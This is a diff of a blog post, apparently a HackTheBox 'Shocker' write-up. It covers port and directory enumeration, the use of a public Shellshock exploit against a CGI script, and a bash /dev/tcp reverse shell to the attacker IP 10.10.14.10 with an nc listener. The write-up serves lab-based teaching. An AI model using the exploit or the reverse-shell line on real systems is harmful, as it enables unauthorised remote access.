@@ -12,10 +12,11 @@ tags:
 As promised, here is the first of the HackTheBox write-ups that I am going to be putting out weekly. For the first write-up I picked the first Linux box from TJNull's excellent [list of OSCP-like HackTheBox machines][htb-list] (that I hadn't already pwned).
 
 ## Phase 1: Enumeration
+
 As with any boot2root, the first step is kicking off some external port scans to see whats up and kicking. I recently discovered [AutoRecon][autorecon] by Tib3ruis, and I have since made it a staple of my boot2root arsenal. It's great at automating all the low level stuff that you would be doing by hand, and it can usually find the low-hanging fruit pretty fast.
 
 ```bash
-$ autorecon -o shocker --single-target 10.10.10.56  
+autorecon -o shocker --single-target 10.10.10.56  
 ```
 
 From the `nmap` output we can see that there is a web-server on port 80, and SSH on port 2222.
@@ -37,11 +38,11 @@ PORT     STATE SERVICE REASON         VERSION
 |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
 ```
 
-SSH on 2222 is a little odd, but I'm going to chalk this up to just avoiding top-10 port scans. The web server seems like the juicy target here, but I'm going to just do a quick check to make sure that the SSH service isn't using any [bad keys][bad-keys]. 
+SSH on 2222 is a little odd, but I'm going to chalk this up to just avoiding top-10 port scans. The web server seems like the juicy target here, but I'm going to just do a quick check to make sure that the SSH service isn't using any [bad keys][bad-keys].
 
 ```bash
-$ cd ~/tools/ssh-badkeys
-$ grep -R "AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREG" .
+cd ~/tools/ssh-badkeys
+grep -R "AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREG" .
 ```
 
 Nadha, worth a shot. Now that I know the SSH is secure, it's time to poke at the web-server. The first step to any web-server enumeration is always to perform directory enumeration, which `autorecon` has handily done for us. Time to check the GoBuster output.
@@ -70,21 +71,23 @@ Nadha, worth a shot. Now that I know the SSH is secure, it's time to poke at the
 Hmmm, not a lot there. I'm going to kick off another scan with a bigger wordlist just incase something was missed. This time I'm going to use `ffuf` because its speed is unrivaled and I am more familiar with its flags.
 
 ```bash
-$ ffuf -u http://10.10.10.56/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -of csv -o ./raft-large.csv
+ffuf -u http://10.10.10.56/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -of csv -o ./raft-large.csv
 ```
 
 While that was running, I went to check the other `autorecon` scan output. This is where I ended up getting stuck for some time because I didn't properly enumerate the "cgi-bin" directory. I went diving down other rabbit holes, and eventually had to look up a hint. I was close in my enumeration attempts, but I just used the `CGIs.txt` file as my wordlist from the web root (which didn't have the endpoint I needed).
 
 **Wrong Command (That I Ran)**
+
 ```bash
-$ ffuf -u http://10.10.10.56/FUZZ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -of csv -o ./raft-cgis-ext.csv -e .cgi,.php,.py,.sh
+ffuf -u http://10.10.10.56/FUZZ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -of csv -o ./raft-cgis-ext.csv -e .cgi,.php,.py,.sh
 ```
 
 What I should have done was to scan the "cgi-bin" directory using a wordlist like `raft-large-directories.txt` with the extensions I specified.
 
 **Right Command (That I Should Have Run)**
+
 ```bash
-$ ffuf -u http://10.10.10.56/cgi-bin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -of csv -o ./raft-cgi-bin-ext.csv -e .cgi,.php,.py,.sh
+ffuf -u http://10.10.10.56/cgi-bin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -of csv -o ./raft-cgi-bin-ext.csv -e .cgi,.php,.py,.sh
 ```
 
 Nearly immediately we can see the new endpoint.
@@ -96,6 +99,7 @@ user.sh                 [Status: 200, Size: 118, Words: 19, Lines: 8]
 This can stand as a valuable learning lesson for the future. Always, always, always properly enumerate directories - even if the root gives you a 403. Each directory should always be put through some directory enumeration tool, such as `ffuf`, so that better coverage can be achieved.
 
 ## Phase 2: Exploitation
+
 From here, I kind of cheated a little. I used some intuition by looking at the name of the Box and the location of *the only endpoint we found* and assumed that the box was vulnerable to ShellShock. So, I looked up some shellshock exploits using `searchsploit` and found a few candidates. There were `metasploit` modules for this exploit, but I didn't want to use `metasploit` so I looked for stand alone exploits.
 
 ```bash
@@ -107,9 +111,9 @@ Apache mod_cgi - 'Shellshock' Remote Command Injection | linux/remote/34900.py
 Lets go ahead and pull that one down and inspect it.
 
 ```bash
-$ ssp -m linux/remote/34900.py
-$ mv 34900.py shellshock.py
-$ less shellshock.py
+ssp -m linux/remote/34900.py
+mv 34900.py shellshock.py
+less shellshock.py
 ```
 
 ```python
@@ -123,9 +127,9 @@ proxyhost = ""
 proxyport = 0
 
 def usage():
-	print """
+ print """
 
-		Shellshock apache mod_cgi remote exploit
+  Shellshock apache mod_cgi remote exploit
 
 Usage:
 ./exploit.py var=<value>
@@ -169,11 +173,13 @@ shelly
 Rock on! We have a shell on the target. Next up is to make this shell into something a little more serviceable. I didn't like the way I was encapsulated in a python script, so I made a new reverse shell connection using `bash` and `nc`.
 
 **Victim**
+
 ```bash
-$ bash -i >& /dev/tcp/10.10.14.10/1234 0>&1
+bash -i >& /dev/tcp/10.10.14.10/1234 0>&1
 ```
 
 **Kali**
+
 ```bash
 $ nc -nlvp 1234
 listening on [any] 1234 ...
